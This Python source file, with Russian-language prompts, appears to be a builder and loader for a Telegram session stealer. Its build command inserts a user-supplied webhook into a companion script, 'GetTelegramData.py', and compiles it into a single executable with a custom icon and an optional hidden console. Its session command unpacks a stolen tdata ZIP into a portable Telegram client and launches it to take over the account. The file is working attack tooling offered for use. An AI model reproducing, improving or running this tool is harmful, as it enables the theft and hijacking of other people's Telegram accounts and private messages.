import os
import time
import shutil
import zipfile
import getpass
import requests
import subprocess
from tqdm import tqdm

os.system('title TelegramQS')

Logo = """
    \033[96m

 _______ _______        _______  ______  ______ _______ _______   ______  _______
    |    |______ |      |______ |  ____ |_____| |_____| |  |  |   |     | |______
    |    |______ |_____ |______ |_____| |    |_ |     | |  |  |   |____/| ______|
    
    \033[0m
    """

def clear():
    os.system("cls")
    print(Logo)

clear()

def change(text):

    with open ("GetTelegramData.py", 'r', encoding='utf-8') as f:
        old_data = f.read()
        new_data = old_data.replace(text, "weebhoook")

    with open ("GetTelegramData.py", 'w', encoding='utf-8') as f:
        f.write(new_data)

    OK("Webhook загружен в файл.")

def OK(Text):
    print(f"\033[92m[+] {Text}\033[97m")

def Info(message):
    print(f"\033[96m[!] {message}\033[0m")

def Error(message):
    print(f"\033[31m[Error] {message}\033[0m")

def Enter(text):
    data = input(f"\033[96m{text}\033[97m")
    
    return data

try:
    username = getpass.getuser()
    standard_path_telegram = f"C:\\Users\\{username}\\AppData\\Roaming\\Telegram Desktop"

    Telegram_Url = "https://telegram.org/dl/desktop/win64_portable"
    download_path = os.path.join(os.path.expanduser("~"), "Desktop", "telegram_win64_portable.zip")

    script_dir = os.path.dirname(os.path.realpath(__file__))
    tdat_path = os.path.join(script_dir, "Telegram", "tdata")
    Telegram_portable = os.path.join(script_dir, "Telegram", "Telegram.exe")

    def create_session():
        global path_to_file
        
        clear()
        path_to_file = Enter("Введите путь до файла сессии: ")
        
        if os.path.isfile(path_to_file) and path_to_file.endswith('.zip'):
            Info("ZIP file was found!")
        else:
            Error("ZIP file was not found!")
            Info("Click to try again!")
            os.system('pause')
            create_session()

        starting_session()

    def starting_session():
        Info("Starting...")
        
        with open(os.devnull, 'w') as devnull:
            os.system("taskkill /f /im Telegram.exe >nul 2>&1")
        
        Info("Телеграм закрыт")
        
        with zipfile.ZipFile(path_to_file, 'r') as zip_ref:
            file_count = len(zip_ref.infolist())

        with zipfile.ZipFile(path_to_file, 'r') as zip_ref:
            for file_info in tqdm(zip_ref.infolist(), total=file_count, desc="Обработка..."):
                file_name = file_info.filename
                zip_ref.extract(file_name, tdat_path)
        
        OK(f"Телеграм с сессией был запущен.")
        subprocess.Popen(f"{Telegram_portable}")
        os.system('pause')
    
    def create_tdat():
        if not os.path.exists(tdat_path):
            os.makedirs(tdat_path)
            Info("Создана папка.")
        else:
            Info("Папка уже существует!")

    def clear_tdat():
        os.system("taskkill /f /im Telegram.exe >nul 2>&1")
        time.sleep(2)
        Info("Подождите...")
        if os.path.exists(tdat_path):
            shutil.rmtree(tdat_path)
            OK("Папка удалена.")
            create_tdat()
        else:
            Error("Папка не найдена.")
    
    def download():
        try:
            response = requests.get(Telegram_Url, stream=True)
            total_size = int(response.headers.get('content-length', 0))
            
            with open(download_path, 'wb') as f, tqdm(total=total_size, unit='B', unit_scale=True, desc="Скачивание...") as pbar:
                for data in response.iter_content(chunk_size=1024):
                    f.write(data)
                    pbar.update(len(data))
            Info("Телеграм установлен!")

            with zipfile.ZipFile(download_path, 'r') as zip_ref:
                zip_ref.extractall(script_dir)
            os.remove(download_path)
        
        except Exception as e:
            Error(f"An error occurred during download: {e}")
    
    def build(type):
        clear()

        Webhook = Enter("Webhook: ")
        icon_path = Enter("Путь до иконки: ")
        name = Enter("Придумайте имя для исходника: ")

        with open ("GetTelegramData.py", 'r', encoding='utf-8') as f:
            old_data = f.read()
            new_data = old_data.replace("weebhoook", Webhook)
        with open ("GetTelegramData.py", 'w', encoding='utf-8') as f:
            f.write(new_data)


        if type == 1:
            
            print(f"Параметры сборки: [ Сборщик: Pyinstaller | Иконка: {icon_path} | Имя (.exe): {name}]")
            
            flag = Enter("Использовать скрытую консоль? (Y/n): ")

            if flag == "Y" or flag == "y":
                if icon_path and name:
                    os.system(f"pyinstaller GetTelegramData.py --onefile --icon={icon_path} --noconsole --name={name}")

                    os.rename('dist', f"{name}")
                    os.remove(f'{name}.spec')
                    shutil.rmtree('build')

                    OK(fr"Исходник будет тут: {name}\{name}.exe")

                    change(Webhook)

                else:
                    Error("Недостаточно данных.")

            if flag == "N" or flag == "n":
                os.system(f"pyinstaller GetTelegramData.py --onefile --icon={icon_path} --name={name}")

                os.rename('dist', f"{name}")
                os.remove(f'{name}.spec')
                shutil.rmtree('build')

                OK(fr"Исходник будет тут: {name}\{name}.exe")

                change(Webhook)

            else:
                pass

        elif type == 2:
            Info(f"Сборка запущена! [ Сборщик: Nuitka | Иконка: {icon_path} | Имя (.exe): {name}]")
            Info("Внимание! Сборка может быть долгой, но эффективной!")
            os.system("nuitka --onefile GetTelegramData.py")
            
            change(Webhook)

            OK("Сборка выполнена!")
            
        elif type == 3:
            cmd = Enter("Команда для сборки: ")
            os.system(cmd)
        
        
        
        else: Error("Ошибка 'Type' в функции build!")

    def builder():
        clear()

        print("[1] Pyinstaller (Быстрая сборка) | [2] Nuitka (Быстрый .exe) | [3] Своя сборка")

        build_type = Enter("Выберите тип сборки: ")

        if build_type == '1': build(1)
        elif build_type == '2': build(2)
        elif build_type == '3': build(3)
        else: Error("Неверные данные!")

    def help():
        clear()

        print("\033[95m*[Команды]\n\033[95m[1]\033[97m Cleardata --> Очистить папку\n\033[95m[2]\033[97m Download  --> Установка телеграма\n\033[95m[3] \033[97mTdata     --> Создать tdata\n\033[95m[4] \033[97mSession   --> Создать (войти) по сессии\n\033[95m[5] \033[97mClear     --> очистить консоль\n\033[95m[6] \033[97mBuild     --> очистить консоль\033[97m")
    
    def check_command(command):
        if command == "dataclear" or command.lower() == "cleardata":
            clear_tdat()
        elif command == "download" or command == "Download":
            download()
        elif command == "tdata" or command == "Tdata":
            create_tdat()
        elif command == "session" or command == "Session":
            create_session()
        elif command == "clear" or command == "cls":
            clear()
        elif command == "help" or command == "Help":
            help()
        elif command == "build" or command == "Build":
            builder()
        elif command == "" or command == " ":
            pass
        else:
            Error("Команда не найдена! [help]")
        
    while True:
        command = input("\033[93m--->\033[97m ")
        check_command(command)

except PermissionError as e:
    Error(f"Нету прав: {e.filename}.")
    os.system('pause')

except KeyboardInterrupt:
    clear()

except Exception as e:
    Error(e)
    os.system('pause')
    